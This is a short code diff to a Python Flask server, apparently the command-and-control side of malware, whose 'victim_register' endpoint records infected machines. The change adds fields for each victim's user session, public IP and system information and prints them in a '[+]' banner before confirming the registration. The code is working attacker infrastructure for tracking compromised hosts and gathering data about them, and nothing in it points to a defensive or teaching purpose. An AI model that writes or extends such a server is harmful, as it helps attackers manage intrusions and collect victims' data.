@@ -16,9 +16,20 @@ def home():
 def victim_register():
     data = request.get_json()
     if data:
+
         victim = data.get("victim_ID")
+        user = data.get("current_user")
+        ip = data.get("public_ip")
+        sys_info = data.get("system_info")
+
         print(f"\n[!] Endpoint detected")
-        print(f"[!] Victim ID : {victim}")
+        print(f"[*] -----------------------------------------")
+        print(f"[+] Victim ID    : {victim}")
+        print(f"[+] User Session : {user}")
+        print(f"[+] Public IP    : {ip}")
+        print(f"[+] System Info  : {sys_info}")
+        print(f"[*] -----------------------------------------")
+
         return {"status": "success", "message": "ID OK"}, 200
     return {"status": "error", "message": "No data send"}, 400
 
